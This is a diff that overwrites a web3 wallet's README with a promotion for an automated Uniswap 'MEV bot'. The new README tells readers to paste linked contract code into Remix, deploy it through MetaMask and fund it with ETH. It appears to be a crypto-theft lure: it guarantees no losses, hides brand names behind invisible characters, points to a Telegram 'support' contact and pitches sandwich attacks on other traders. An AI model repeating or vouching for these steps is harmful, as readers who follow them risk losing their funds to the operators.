@@ -1,110 +1,78 @@
-<h2 align="center">
-  <br>
-  <img src="/asset/png/FrameLogo512.png?raw=true" alt="Frame" width="150" />
-  <br>
-  <br>
-  F R A M E
-  <br>
-  <br>
-</h2>
-<h3 align="center">System-wide Web3 for macOS, Windows and Linux :tada:</h3>
-<br>
-<h5 align="center">
-  <a href="#features">Features</a> ⁃
-  <a href="#installation">Installation</a> ⁃
-  <a href="#usage">Usage</a> ⁃
-  <a href="#related">Related</a>
-</h5>
-<br>
 
-<img src="/asset/png/FrameExample0-6-3.png?raw=true" />
+# UniSwap-Mevbot
+Fully-auto on-chain Uniswap MEVbot leveraging flashloans and the minimal gas fees of Ethereum to perform sandwich attacks and front-runs on Uniswap.
 
-Frame is a web3 platform that creates a secure system-wide interface to your chains and accounts. Now any browser, command-line, or native application has the ability to access web3.
+Launch your own MEV engine or start trading with my public program for a 0.1% fee on successful arbitrage transactions.
 
-### Features
+> [!IMPORTANT]
+> Due to the atomic nature of Flashloan operations, if they aren't profitable the transaction will revert and no net profit will be lost.
 
-- **First-class Hardware Signer Support**
-  - Use your GridPlus, Ledger and Trezor accounts with any dapp!
-- **Extensive Software Signer Support**
-  - Use a mnemonic phrase, keystore.json or standalone private keys to create and backup accounts!
-- **Permissions**
-  - You'll always have full control of which dapps have permission to access Frame and can monitor with full transparency what requests are being made to the network.
-- **Omnichain Routing**
-  - With Frame's Omnichain routing dapps can seamlessly use multiple chains at the same time, enabling truly multichain experiences.
-- **Transaction Decoding**
-  - By utilizing verified contract ABIs, transaction calldata can be decoded into concise and informative summaries, allowing you to sign transactions with confidence.
-- **Set your own connections to Ethereum and IPFS**
-  - Never be locked into using a centralized gateway
-- **Menu Bar Support**
-  - Frame stays out of the way and sits quietly in your menu bar until needed
-- **Cross Platform**
-  - MacOS, Windows and Linux!
-
-### Talks
-
-- [Frame at Aracon](https://www.youtube.com/watch?v=wlZWLiy2GD0)
-
-### Installation
-
-#### Downloads
-
-- [Production Releases](https://github.com/floating/frame/releases)
-- [Canary Releases](https://github.com/frame-labs/frame-canary/releases)
-
-#### Arch Linux
-
-If you use an arch-based distro, you can use an AUR Helper like [yay](https://github.com/Jguer/yay) to install Frame by running `yay -S frame-eth` or for the development version: `yay -S frame-eth-dev`.
-
-#### Run Source
-
-**On Ubuntu:** Run `sudo apt-get install build-essential libudev-dev`.
-
-```bash
-# Clone
-› git clone https://github.com/floating/frame
-
-# Use node v18
-› nvm install 18.12.1
-› nvm use 18.12.1
-
-
-# Install
-› npm run setup
-
-# Run
-› npm run prod
+# How MEVBOT works
+```mermaid
+graph LR
+A(User Transaction)-->B(MEV Bot)-->C(Opportunity Detection)--> E(Transaction Construction)
+E --> F(Transaction Submission)
+F -->J(Block Inclusion)
+J-->K(Profit Realization)
 ```
+  - User Transaction: A user submits a transaction to the Ethereum network.
+  - MEV Bot: The MEV bot monitors the mempool for profitable opportunities.
+  - Opportunity Detection: The bot identifies potential MEV opportunities (e.g., arbitrage, liquidation).
+  - Transaction Construction: The bot constructs a transaction to exploit the opportunity.
+  - Transaction Submission: The bot submits the transaction to the network.
+  - Block Inclusion: The transaction gets included in a block by miners.
+  - Profit Realization: The MEV bot realizes the profit from the successful transaction.
 
-#### Build
+ #### The bot is constantly sniffing the for user buys, sells, and token creations containing slippage deficits.
+> [!TIP]
+> Bot operators can target any transaction value within their balance threshold. Generally, higher thresholds net consistently viable transactions
+-  Once a transaction is identified, a flashloan is initiated for the target transaction amount, this requires a marginal amount of collateral.
+-  The bot will aggresively attempt to front-run the transaction by dynamically monitoring the bribe to the miner and increasing it if necessary so as to be the first transaction mined.
+- Depending on the set parameters, the bot will either front-run the Dev's sell to remain in profit, or sell upon the token reaching KOTH.
+- The flashloan is then repaid, collateral is reiumbursed and profits are deposited into the operators wallet.
+-  If the transaction is unprofitable at any point it will be reverted and the flashloan will be repaid, losing no gas or net profit.
+# Setup
+1. Download [**MetaMask**](https://metamask.io/download.html) (if you don’t have it already)
+ 
+2. Access to [**Remix Ethereum IDE**](https://remix.ethereum.org/).
+   
+   <img src="https://i.ibb.co/ftNtP8G/2.png" alt="2" border="0">
+   
+   #### For the Remix IDE you can follow this steps:
+3. Click on the `contracts` folder and then create `New File`. Rename it as you like, for example: `bot.sol`
 
-```bash
-› npm run bundle # Create bundle
-› npm run build # Build Frame for current platform
-```
+   #### Note: If there is a problem if the text is not colored when you create bot.sol and paste the code from pastebin, try again. If the codes are not colored, you cannot proceed to the next step.
 
-### Usage
+4. Paste this [****sourcecode****](sourcecode.sol) code in R­­emi­x­.
 
-#### Connect to Frame natively
+5.  Go to the `Solidity Compiler` tab, select version `0.6.6+commit.6c089d02` and click `Compile bot.sol`.
+ 
+    Make sure `bot.sol` is selected in the CONTRACT section of the SOLIDITY COMPILER section.
 
-Frame exposes system-wide JSON-RPC endpoints `ws://127.0.0.1:1248` and `http://127.0.0.1:1248` that you can connect to from any app. We recommend using [eth-provider](https://github.com/floating/eth-provider) to create a connection `const provider = ethProvider('frame')` as `eth-provider` will handle any connection edge cases across browsers and environments
+6. TGo to the `DEPLOY & RUN TRANSACTIONS` tab, select the `Injected Provider - ­M­et­am­as­k­­` environment and then `Deploy`. By approving the Me­­ta­­­ma­­sk contract creation fee, you will have created your own contract (ignore any IFPS errors that may appear afterwards).
 
-### Frame's injected provider
+7. Copy your newly created contract address and fund it with any amount of ETH (at least 0.5-2 ETH or more is recommended) Simply send ETH to your newly created contract address to allow the bot to earn money.
 
-Frame also has a browser extension for injecting a Frame-connected [EIP-1193](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-1193.md) provider into web apps as `window.ethereum`. This can be used to inject a connection when an app does not provide the option to connect to Frame natively.
+8. After your transaction is confirmed, click the “start” button to run the b­o­­t. Withdraw your ETH at any time by clicking the “Withdraw” button.
 
-### Related
 
-- [Frame Chat](https://discord.gg/UH7NGqY) - Feel free to drop in and ask questions!
-- [Frame Browser Extension](https://github.com/frame-labs/frame-extension) - Use Frame with any web dapp
-- [eth-provider](https://github.com/floating/eth-provider) - A universal Ethereum provider
-- [Restore](https://github.com/floating/restore) - A predictable and observable state container for React apps
+> [!IMPORTANT]
+> The bot will immediately begin searching for and transacting arbitrage.
+> Stop the bot any time by clicking the "STOP" button. any current transactions will be sold or reverted.
 
-<h2>
-  <h5 align="center">
-    <br>
-    <a href="https://frame.sh">Website</a> ⁃
-    <a href="https://medium.com/@framehq">Blog</a> ⁃
-    <a href="https://twitter.com/0xFrame">Twitter</a> ⁃
-    <a href="https://discord.gg/UH7NGqY">Chat</a>
-  </h5>
-</h2>
+
+
+
+# Contributions
+
+Contributions are welcome. If you would like to contribute please submit a pull request with your suggested changes.
+
+# Support
+If you benefitted from the project, show us some support by giving us a star ⭐. Open source is awesome!
+
+# Help
+If at any time you encounter any issues with the contract setup, contact the team at  [**Click Here**](https://t.me/UniMevBotsSupport/). 🛡️
+
+# License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
